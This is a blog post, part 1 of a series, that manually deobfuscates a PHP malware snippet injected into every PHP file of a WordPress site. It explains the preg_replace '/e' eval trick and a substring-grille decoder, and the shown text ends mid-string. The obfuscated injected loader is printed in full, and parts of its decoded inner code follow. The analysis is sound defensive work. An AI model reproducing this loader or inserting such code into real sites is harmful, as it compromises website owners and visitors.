---
layout: post
title: "Manual deobfuscation of a PHP snippet - Part 1"
date: 2014-10-10 20:50:00 +0200
comments: true
categories: 
---

In late July the following question was posted on a IRC-channel i frequent: 

> Anyone care to devise what an obfuscated PHP payload does?

Sure, why not, sounds like a challenge. This is part 1 of a series of blogposts explaining the headache-inducing three hours that followed.

<!-- more -->

The following snippet had been added to the top of _every_ PHP file in a Wordpress installation. Scroll right to see it all. _Far_ _right_.
```php
<?php $fognhntadd = '825h>#]y31]278]y3e]81]K78:56985:6197g>2b%x5c%x7825!<*qp%x5c%x7825-*.%x5c%x7825)euh]341]88M4P8]37]278]225]241]334]368]322]3]364]6]283ldbqov>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x5c%156%x61"])))) { $GLOBALS["%x61%156%x75%156%x61"]=1;5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*!f!}Z;^nbsbq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x7825%x5c%x7825!*9!%x5c%x7827!hmg%x5c%x7825b*[%x5c%x7825h!>!%x5c%x7825fmjgk4%x5c%x7860{6~6<tfs%x5c%x7825w6<%x5%x5c%x78e%x5c%x78b%x5c%x7825w:!>!%x5c%x78246767~6<Cw6<pd#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#*%x5c%x7824%x5c%x78OJ%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787f%x35%165%x3a%146%x21%76c%x785c1^-%x5c%x7825r%x5c%x785c2^-%x5c%x7825hOh%x]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gPpde:4:|:**#ppde#)tutjyf%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f7%x5c%x78257-C)fepmqnjA%x5c%x78!>!2p%x5c%x7825Z<^2%x5c%x785c2b%x5c%x7825!>!2px7822)gj6<^#Y#%x5c%x785cq%x5c%A)3of>2bd%x5c%x7825!<5h%x5c%x7825%x5c%x782f#0#%x5c%x782f*#n2f%x5c%x7825kj:-!OVMM*<(<%x5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]27d}R;*msv%x5c%x7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x55c%x7825t2w>#]y74]273]y76]2x5c%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hopmA%x5c%x78273w6*3qj%x5c%x78257>%x5c%x782272qj%:74985-rr.93e:5597f-s.973:8297f:5297e:56-%x5c%x7878r.985:%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:^<!%x5mmvo:>:iuhofm%x5c%x7825:-5p function fjfgg($n){return chr(ord(]317]445]212]445]43]321]464]284]364]6]234]342x5c%x7824-%x5c%x7824tvctus)%x5c%x7825%x5c%x7824-%x7825iN}#-!tussfw)%x5c%x7825c*W%x5c%x78%x782f#%x5c%x7825#%x5c%x782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x*w%x5c%x7825)kV%x5c%x7878{**f%x5c%x786057ftbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmx5c%x787f!>>%x5c%x7822!pd%x5c%x78254y]552]e7y]#>n%x5c%x7825<#372]58y]472]37y]672]48y]#>s%x5c%x7%x78e%x5c%x78b%x5c%x7825mm)x7825tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%x5c%x782f#M5x78257>%x5c%x782f7&6|7**111127-K)ebfsX5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%d%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce25z!>2<!gps)%x5c%x7825j>1<%x5c%x7825j#)usbut%x5c%x7860cpV%x5c%x787f%x5c%n%x5c%x7825)utjm6<%x#-#}+;%x5c%x7825-qp%x5c%29%51%x29%73", NULL); }c%x7824gps)%x5c%x7825j>1<%x55c%x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fepdof.)fepdof.%x5c%x75c%x7825tww**WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x723ldfidk!~!<**qp%x5c%x7825!-uy82fh%x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5c%x7825:|:**t%x5c%x7825)!gj!|!*1?hmg%x5cx5c%x782f7#@#7%x5c%x782f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jx5c%x785cq%x5c%x78257**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%opo#>b%x5c%x7825!*##>x7825)fnbozcYufhA%x5c%x78272qj%x7825)ftpmdR6<*id%x5c%x7825)dfyfR%0hfsq)!sp!*#ojneb#-*f%x5c%x7825)sf%x5c%x787%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c%x7867825%x5c%x7824-%x5c%x7824!>!f%x21%50%x5c%x7825%x5c%x7878:!x7825)!gj!<2,*j%x5c%x7825-#1]#-bubE{h%x5c%x7825)tpqsut>j&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,475c%x7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPtjw!>!#]y84]275]y83]248]y85tmw!>!#]y84]275]y83]273]y76]277#<%x824-%x5c%x7824%x5c%x785c%x5c%x7825j^%5)tpqsut>j%x5c%x7825!*72!%x5c%x7827!hmg%x5c%y3:]84#-!OVMM*<%x22%51%xc%x7860msvd},;uqpuft%x5c%x7860msvd}+%x5c%x7827u%x5c%x7825)7fc%x787f;!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<*127-UVP5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj$n)-1);} @error_reporting(0); preg_replace("%x2f%50%x2e%52%|!*bubE{h%x5c%x7825)j{h782f35.)1%x5c%x782f14+9**-)1%x5c%x782f2986+7**^%x5c%x782ftuofuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt%x5c%x7825}K;%x5c%c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.4x7825>U<#16,47R57,27R66,#%x5c%x782fq%xisset($GLOBALS["%x61%156%x75x5c%x7824-%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5c%x7824gvodujpo!%x5c%x782%x5c%x7860bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<*#k%x782f%x5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-]27]28y]#%x5c%x782fr%x5c%x7825%x5c%x77eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%x7827*&7-<!%x5c%x7825o:!>!%x5c%x78:]268]y7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%x5c%x7825_t%x5c%x7825:osv%x7825):fmji%x5c%x7878%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:N"%x6f%142%x5f%163%x74%141%x72%164") && (!]y81]273]y76]258]y6g]273]y76]271]y7d]252]y74]256#us%x5c%x7860sfqmbdf)%x5c%x7825%x5c%mji%x5c%x78786<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x7878<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_*#[k2%x5c]y6g]273]y76]271]y7d]252]y74]256]y39]252]y83]273]y72]282#<!%x5c%x78257L6M7]D4]275]D:M8]Df#<%25>j%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)]58]24]31#-%x5c%x7825tdz*Wsfuvso!%x5c%x7825bss%x5c%x785csboe))1%x5c%xc%x7824-tusqpt)%x5c%x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7%x7825)!gj!<**2-4-bubE{h%x5c%x7825)sutcvt)esp>hm827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c%x7825!-#2#%x5cx7825%x5c%x7827Y%x5c%x7825652]y85]256]y6g]257]y86]267]y74]275]y725eN+#Qi%x5c%x785c1^W%x5c%x7825c!>!%x5c%x7825i%x5c%x785c2^<!Ce*[!%x5tdz)%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c}X;!sp!*#opo#>>}R;msv}.;}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!}%x5%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x5c<.msv%x5c%x7860ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXk]y81]265]y72]254]y76]61]yh%x5c%x7825!<*::::::-111112)eobs%xnpd!opjudovg!|!**#j{hnpd#)tutj%162%x61%171%x5f%155%x61%160%x28%42%x66%152%x66%147%x67%42%xc%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UF7825)3of:opjudovg<~%x5c%x78245]K2]285]Ke]53Ld]53]Kc]55Ld]551%x6d%160%x6c%157%x64%145%x28%141%x72NFS&d_SFSFGFS%x5c%x7860QUUI&c_UOFHB%x5c%x7860SFTV%x5c%x7860QUU#k#)tutjyf%x5c%x7860%x5c%x7878%x5c%x7822l:!]y4:]82]y3:]62]y4c#<!%x5c%x7825t::!>!%!%x5c%x7825b:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:.2^,%x5c%x7825b:<!27&6<.fmjgA%x5c%x7827doj%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#5#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x7825fdy<C787f;!opjudovg}k~~9{d%x5c%x7825:osvufs:~928>>%x5c%x73]256]y81]265]y72]254]y76#<%x5c%x782x7825)54l}%x5c%x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%xrfs%x5c%x78256<#o]1%x5c%x782f20QUUI7jsv%x5c%x782tutjyf%x5c%x7860opjudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftm8984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%>#]y3g]61]y3f]63]y3:]68]y76#<jepdoF.uofuopD#)sfebfI{jg!)%x5c%x7825z>>2*!%x5I&b%x5c%x7825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#822:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttfsqnpdov{htussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x782%x7825)m%x5c%x7825=*h%x5c%x7825)m%x5cx7825!<***f%x5c%x7827,*e%xufs:~:<*9-1-r%x5c%x7825)s%x5c%x825<#462]47y]252]18y]#>q%x5c%x7825<#762]67y]562]y31M6]y3e]81#%x5c%x782f#7e:55946-tr.984:75983:4>X)!gjZ<#opo#>b%x5c%x7825!**1y]c9y]g2y]#>>*4-1-bubE{h%x5c%x7825)sutcvt)!gj!qj%x5c%x78256<*Y%x5c%c%x7825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvs57UFH#%x5c%x7827rfs%x5c%x78256~6<%x5c%x787fw6<*K)ftpm8pmpusut)tpqssutRe%x5c%x7825)Rc%x7825z>3<!fmtf!%x5c%x7825z>2<!c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x5c%x7824Ypp3)%x5c%x7825cB%x5cvodujpo)##-!#~<#%x5c%x782f%x5c%x%x5c%x7825w6Z6<.5%x5}#-%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x5c%x78254-%x5c%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5x5c%x7878;0]=])0#)U!%x5c%x7fu%x5c%x7825)3of)fepdo%x5c%x7825!*3>?*2b%x5c%x7825)gpf{jt)!gj!<*2bd%x5c%x7>q%x5c%x7825V<*#fopoV;ho0hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.2%x5c%x7861]y35]256]y76]72]y3d]51]y35]274dXA6|7**197-2qj%x5c%x78257-K)udfoopdXA%x5c%x7822)7gj6<*QDU%x5f!~<**9.-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgoj{hA!o0hA%x5c%x7827pd%x5c%x78256<C%x5c%x7827pd%x5c%x78256|6.=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7825z<if((function_exists(x5c%x78256<^#zsfvr#%x5c%x785cq%x5c%x78257%x69%164%50%x22%134%x78%62***b%x5c%x7825)sf%x5c%x7878pmpusut!38y]572]48y]#>m%x5c%x7825:|:*r%x5c%x7825:-t%x5c%x827id%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#ujojRk3%x5c%x7860{6R25,d7R17,67R37,#%x5c%x782fq%x5c%82f#@#%x5c%x782fqp%x5c%x7825>5o!sboepn)%x5c%x7825epnbss-%x5c%x7825r%x5c%x7878W~x7860ufldpt}X;%x5c%x7860msv%x5c%x782f#%x5c%x782f#%x5c%x782f},;x29%57%x65","%x65%166%x61%154%x28%1%x5c%x7824b!>!%x5c%x7825yy)#}#-#%x5c%x7824-%x552985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84])!gj}Z;h!opjudovg}{;#)sv%x5c%x78256<C>^#zsfvr#%5c%x785c}X%x5c%x7824<!%x5c%x7825tzw>!#]y76]277]y72]265]y39]274]y85]273x5c%x7825tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]24%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;5wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5yqmpef)#%x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]52c%163%x74%162%x5f%163%x70%154%3]y76]258]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x%x7825j:>>1*!%x5c%x7825b:>1<!fmtf19275j{hnpd19275fubmgoj{h1:|:*7825>%x5c%x782fh%x5c%x7825:<pd%x5c%x782f#)rrd%x5c%x782f#00;quui#>.%x5c%svufs!~<3,j%x5c%x7825>j%x5c%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<g%x5c%x7825!<12>j%x5c%x7825!|!*#95c%x782f+*0f(-!#]y76]277]y72]265]y39]271]y83]256]y78]248]y83]2565%x5c%x7824-%x5c%x7824*!|!%x5c%x744#)zbssb!>!ssbnpe_GMFT%x)!gj!~<ofmy%x5c%x7825,3,j%x5c%x78<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x5c%x7824-%x5c%x7824-!%x5c%x782c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x7860gj:>1<%x5c%x7825j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x5c]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32M3yf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%x787f!~!<##5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x33]68]y34]68]y33]65]y31]53]y6d]281]y43]78]y33]65]y31]55]y85]82]y76]62]-#j0#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb2,*j%x5c%x7825!-#1]#-bubE{h%x5c%x782:<##:>:h%x5c%x7825:<#6**#57]38y]47]67y]37]88y5c%x7825>2q%x5c%x7825<#g6R85,67R37,18R#%x5c%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x7825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#x7824-%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x7824]26%242178}527}88:}334}472%x5c%x7824<!%x5c%x7825mm!>!#66~6<&w6<%x5c%x787fw6*CW&)7gj6fepmqnj!%x5c%x782f!#0#)idubn%x5c%x786c%x7825w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x78X)ufttj%x5c%x7822)gj!|!*nbsbq%x5c%x7825)3!Ypp2)%x5c%x7825zB%x5c%x7825z>!*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7825}&;ftmbg}%x5c%x787f;!osvufs}w;*%825-#1GO%x5c%x7822#)fepmqyfAx787f%x5c%x787f%x5c%x787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x787f<*X/(.*)/epreg_replacempfqsmkdas'; $sjeykdhzzn = explode(chr((238-194)),'7526,20,4122,41,3639,28,183,52,1382,35,3350,59,7933,35,5453,38,5299,60,8374,31,7588,25,608,23,2791,29,6137,29,448,56,6954,20,3549,52,2698,64,7212,55,7416,54,3917,50,2092,20,1914,40,1876,38,3197,24,4247,61,792,39,5973,48,6738,53,7298,61,5359,36,562,46,1212,33,1153,59,6651,21,2590,31,7546,42,2442,64,8079,25,2506,63,907,30,4817,27,5140,70,3303,47,831,30,5700,62,408,40,6853,39,2621,34,3258,45,4635,64,7697,62,9690,30,4308,50,8242,36,3489,60,7871,27,1063,63,3161,36,9942,69,1695,35,8057,22,6021,69,7359,57,8602,68,9358,36,3093,44,2820,56,343,38,8825,33,4450,60,132,51,2419,23,4699,48,8670,33,6604,47,3409,23,5269,30,9116,67,861,46,7136,52,10011,28,37,45,937,59,8559,43,6424,26,2187,70,7792,30,5235,34,235,51,7613,35,9315,43,3743,45,9720,37,2655,43,6791,30,1954,66,8800,25,2942,52,5491,62,6212,68,2569,21,6576,28,9807,41,2322,30,7114,22,1644,51,286,57,4997,24,7898,35,2112,24,5907,66,5819,52,6280,61,8501,30,1355,27,726,66,9879,63,3788,43,2057,35,10039,67,2876,66,7759,33,3601,38,9439,39,7188,24,6166,23,1616,28,5553,43,5021,66,3221,37,7087,27,4747,70,1550,66,8104,70,4358,69,2994,26,5871,36,3020,36,1126,27,4844,37,3992,70,6450,31,8531,28,9416,23,3880,37,2352,67,6387,37,4062,22,9394,22,1730,60,6481,48,7648,49,5395,29,3967,25,9640,50,4163,49,8858,69,8767,33,3056,37,1462,48,7968,46,4579,56,4212,35,9573,67,3667,26,3693,50,7035,52,2159,28,8927,69,6922,32,2762,29,8330,44,7267,31,5596,38,6892,30,1510,40,4881,68,6672,66,7822,49,9848,31,6341,46,8278,52,631,49,9183,62,2257,65,0,37,1245,57,8014,43,6529,47,6090,47,1817,59,680,46,4427,23,8174,68,5424,29,5762,57,381,27,4949,48,9518,55,82,50,9058,58,1417,45,4510,69,3432,57,4084,38,6974,61,8996,62,8468,33,5634,66,1302,53,9757,50,2020,37,7470,56,6189,23,6821,32,5087,53,1790,27,9478,40,3831,49,504,58,996,67,8405,63,8703,64,5210,25,9245,70,3137,24,2136,23'); $jekjvzbupt=substr($fognhntadd,(67419-57313),(30-23)); if (!function_exists('otmxvqaaam')) { function otmxvqaaam($kruvavlbfw, $tmpdlccpfv) { $knpzekviot = NULL; for($mektnikgre=0;$mektnikgre<(sizeof($kruvavlbfw)/2);$mektnikgre++) { $knpzekviot .= substr($tmpdlccpfv, $kruvavlbfw[($mektnikgre*2)],$kruvavlbfw[($mektnikgre*2)+1]); } return $knpzekviot; };} $wrewusbqxp="\x20\57\x2a\40\x67\172\x6d\143\x69\170\x72\146\x69\146\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\70\x33\55\x31\64\x36\51\x29\54\x20\143\x68\162\x28\50\x33\66\x31\55\x32\66\x39\51\x29\54\x20\157\x74\155\x78\166\x71\141\x61\141\x6d\50\x24\163\x6a\145\x79\153\x64\150\x7a\172\x6e\54\x24\146\x6f\147\x6e\150\x6e\164\x61\144\x64\51\x29\51\x3b\40\x2f\52\x20\151\x61\153\x78\144\x62\143\x6b\156\x72\40\x2a\57\x20"; $flwwfkzecg=substr($fognhntadd,(50154-40041),(83-71)); $flwwfkzecg($jekjvzbupt, $wrewusbqxp, NULL); $flwwfkzecg=$wrewusbqxp; $flwwfkzecg=(419-298); $fognhntadd=$flwwfkzecg-1; ?>
```

After adding some newlines and replacing some strings with placeholders we can read the code without pondering our political stance.

```php
<?php 
$fognhntadd = '<horribly long string of non-random characters>'; 

$sjeykdhzzn = explode(
		chr((238-194)),
		'<long string of numbers separated by comma>'
		); 

$jekjvzbupt=substr($fognhntadd,(67419-57313),(30-23)); 

if (!function_exists('otmxvqaaam')) { 
	function otmxvqaaam($kruvavlbfw, $tmpdlccpfv) { 
		$knpzekviot = NULL; 
		for ($mektnikgre=0; $mektnikgre<(sizeof($kruvavlbfw)/2); $mektnikgre++) { 
		$knpzekviot .= substr($tmpdlccpfv, 
				$kruvavlbfw[($mektnikgre*2)],
				$kruvavlbfw[($mektnikgre*2)+1]
				); 
		} 
		return $knpzekviot; 
	};
} 

$wrewusbqxp="<long string of hex-escaped text>"; 
$flwwfkzecg=substr($fognhntadd,(50154-40041),(83-71)); 
$flwwfkzecg($jekjvzbupt, $wrewusbqxp, NULL); 
$flwwfkzecg=$wrewusbqxp;
$flwwfkzecg=(419-298);
$fognhntadd=$flwwfkzecg-1;

?>
```

Let's see if we can make the code a bit more readable:

The ```$fognhntadd``` on line 1 is not code to be executed, but is there to be used by the rest of the code. We can't really make it more readable at this point. 

 ```$sjeykdhzzn``` on line four appears to split its second argument on ```chr((238-194))```. [chr](http://php.net/manual/en/function.chr.php) returns a one-character string containing the character specified by the decimal argument. ```chr(238-194) = chr(44)```, and a quick look in ```man ascii``` tells us that the ASCII character with a decimal value of 44 is , (comma). This means ```$sjeykdhzzn``` will evaluate to an array consisting of 456 (0-455) numbers, every other large (1000+) and small(<50). 

 ```$jekjvzbupt``` on line 9 is a [substring](http://php.net/manual/en/function.substr.php) of the horribly long ```$fognhntadd``` - but how to know what without counting to 10106? (67419-57313=10106).

The code does not appear to to anything dangerious, so let's try to parse it using a PHP engine! *google "run php code online"*. The second result, [sandbox.onlinephpfunctions.com](http://sandbox.onlinephpfunctions.com/) looks promising.

Pasting in ```$fognhntadd```, ```$jekjvzbupt``` and a [var_dump](http://php.net/manual/en/function.var-dump.php), tells us that ```$jekjvzbupt``` evaluates to the string ```/(.*)/e```. While i didn't know at the time, if this string is used in [preg_replace](http://php.net/manual/en/function.preg-replace.php) on a system using PHP prior to 5.5.x, it is basically the same as [eval](http://php.net/manual/en/function.eval.php).

We will skip the function ```otmxvqaaam``` for now.

The escaped string ```$wrewusbqxp``` get the same treatment, and returns the following code:

```
 /* gzmcixrfif */ eval(str_replace(chr((183-146)), chr((361-269)), otmxvqaaam($sjeykdhzzn,$fognhntadd))); /* iakxdbcknr */ 
```

 ```$flwwfkzecg``` evaluates to ```preg_replace```, why am i not surprised?

Line 26 uses ```$flwwfkzecg``` as a function name, and can thus be written like this:

```php
preg_replace('/(.*)/e', 'eval(str_replace(chr((183-146)), chr((361-269)), otmxvqaaam($sjeykdhzzn,$fognhntadd)));', NULL);
```

This can also be written like this, reusing the techniques used above:

```php
$foo = otmxvqaaam($sjeykdhzzn, $fognhntadd);
$bar = str_replace('%', '\\', $foo); # '\\' => \
eval($bar);
```

Suddenly understanding the function ```otmxvqaaam``` defined on line 12 becomes interesting. After renaming some of the variables, the function becomes somewhat easier to read. 

```php
function otmxvqaaam($start_and_length_array, $string) {
	$return_value = NULL; 
	for ($i=0; $i < (sizeof($start_and_length)/2); $i++) {
		$start = $start_and_length_array[($i*2)]
		$length = $start_and_length_array[($i*2)+1]
		$return_value .= substr($string, $start, $length); 
	} 
	return $return_value; 
};
```

This function uses ```$start_and_length_array``` together with ```substr``` as a [grille](http://en.wikipedia.org/wiki/Cardan_grille). The even number positions(0,2,4...) of the array are the positions in the ciphertext, while the odd (1,3,5...) positions are the lengths.

I concluded that the last three lines did nothing that was worth analyzing. We now have enough data to make the code easier to read.

```php
<?php 
$fognhntadd = '<horribly long string of non-random characters>'; 

$sjeykdhzzn = array() {
	0 => "7526",
	1 => "20",
	...
	454 => "2136",
	455 => "23"	
}

function otmxvqaaam($start_and_length_array, $string) {
	$return_value = NULL; 
	for ($i=0; $i < (sizeof($start_and_length)/2); $i++) {
		$start = $start_and_length_array[($i*2)]
		$length = $start_and_length_array[($i*2)+1]
		$return_value .= substr($string, $start, $length); 
	} 
	return $return_value; 
};

$foo = otmxvqaaam($sjeykdhzzn, $fognhntadd);
$bar = str_replace('%', '\\', $foo); # '\\' => \
eval($bar);

?>
```

Since the code up to this point does nothing active (exec, system, fwrite, ...), we can replace ```eval``` with echo in our code, and get the following result:

```php
<?php
if((
	function_exists("\x6f\142\x5f\163\x74\141\x72\164") && 
   	(!isset($GLOBALS["\x61\156\x75\156\x61"]))
  )) { 
  
  $GLOBALS["\x61\156\x75\156\x61"]=1; 

  function fjfgg($n){ 
    return chr(ord($n)-1);
  } 

@error_reporting(0); 

 preg_replace("\x2f\50\x2e\52\x29\57\x65","\x65\166\x61\154\x28\151\x6d\160\x6c\157\x64\145\x28\141\x72\162\x61\171\x5f\155\x61\160\x28\42\x66\152\x66\147\x67\42\x2c\163\x74\162\x5f\163\x70\154\x69\164\50\x22\134\x78\62\x35\165\x3a\146\x21\76\x21\50\x5c\x7825\x5c\x7878:!>#]y3g]61]y3f]63]y3:]68]y76#<\x5c\x78e\x5c\x78b\x5c\x7825w:!>!\x5c\x78246767~6<Cw6<pd\x5c\x7825w6Z6<.5\x5c\x7860hA\x5c\x7827pd\x5c\x78256<pd\x5c\x7825w6Z6<.4\x5c\x7860hA\x5c\x7827pd\x5c\x78256<pd\x5c\x7825w6Z6<.3\x5c\x7860hA\x5c\x7827pd\x5c\x78256<pd\x5c\x7825w6Z6<.2\x5c\x7860hA\x5c\x7827pd\x5c\x78256<C\x5c\x7827pd\x5c\x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf\x5c\x7827*&7-n\x5c\x7825)utjm6<\x5c\x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u\x5c\x78257>\x5c\x782f7&6|7**111127-K)ebfsX\x5c\x7827u\x5c\x7825)7fmji\x5c\x78786<C\x5c\x7827&6<*rfs\x5c\x78257-K)fujs\x5c\x7878X6<#o]o]Y\x5c\x78257;utpI#7>\x5c\x782f7rfs\x5c\x78256<#o]1\x5c\x782f20QUUI7jsv\x5c\x78257UFH#\x5c\x7827rfs\x5c\x78256~6<\x5c\x787fw6<*K)ftpmdXA6|7**197-2qj\x5c\x78257-K)udfoopdXA\x5c\x7822)7gj6<*QDU\x5c\x7860MPT7-NBFSUT\x5c\x7860LDPT7-UFOJ\x5c\x7860GB)fubfsdXA\x5c\x7827K6<\x5c\x787fw6*3qj\x5c\x78257>\x5c\x782272qj\x5c\x7825)7gj6<**2qj\x5c\x7825)hopm3qjA)qj3hopmA\x5c\x78273qj\x5c\x78256<*Y\x5c\x7825)fnbozcYufhA\x5c\x78272qj\x5c\x78256<^#zsfvr#\x5c\x785cq\x5c\x78257\x5c\x782f7#@#7\x5c\x782f7^#iubq#\x5c\x785cq\x5c\x7825\x5c\x7827jsv\x5c\x78256<C>^#zsfvr#\x5c\x785cq\x5c\x78257**^#zsfvr#\x5c\x785cq\x5c\x7825)ufttj\x5c\x7822)gj6<^#Y#\x5c\x785cq\x5c\x7825\x5c\x7827Y\x5c\x78256<.msv\x5c\x7860ftsbqA7>q\x5c\x78256<\x5c\x787fw6*\x5c\x787f_*#fubfsdXk5\x5c\x7860{66~6<&w6<\x5c\x787fw6*CW&)7gj6<*doj\x5c\x78257-C)fepmqnjA\x5c\x7827&6<.fmjgA\x5c\x7827doj\x5c\x78256<\x5c\x787fw6*\x5c\x787f_*#fmjgk4\x5c\x7860{6~6<tfs\x5c\x7825w6<\x5c\x787fw6*CWtfs\x5c\x7825)7gj6<*id\x5c\x7825)ftpmdR6<*id\x5c\x7825)dfyfR\x5c\x7827tfs\x5c\x78256<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv\x5c\x78257-MSV,6<*)ujojR\x5c\x7827id\x5c\x78256<\x5c\x787fw6*\x5c\x787f_*#ujojRk3\x5c\x7860{666~6<&w6<\x5c\x787fw6*CW&)7gj6<.[A\x5c\x7827&6<\x5c\x787fw6*\x5c\x787f_*#[k2\x5c\x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd\x5c\x7860ufh\x5c\x7860fmjg}[;ldpt\x5c\x7825}K;\x5c\x7860ufldpt}X;\x5c\x7860msvd}R;*msv\x5c\x7825)}.;\x5c\x7860UQPMSVD!-id\x5c\x7825)uqpuft\x5c\x7860msvd},;uqpuft\x5c\x7860msvd}+;!>!}\x5c\x7827;!>>>!}_;gvc\x5c\x7825}&;ftmbg}\x5c\x787f;!osvufs}w;*\x5c\x787f!>>\x5c\x7822!pd\x5c\x7825)!gj}Z;h!opjudovg}{;#)tutjyf\x5c\x7860opjudovg)!gj!|!*msv\x5c\x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j\x5c\x7825-bubE{h\x5c\x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j\x5c\x7825>j\x5c\x7825!*3!\x5c\x7827!hmg\x5c\x7825!)!gj!<2,*j\x5c\x7825!-#1]#-bubE{h\x5c\x7825)tpqsut>j\x5c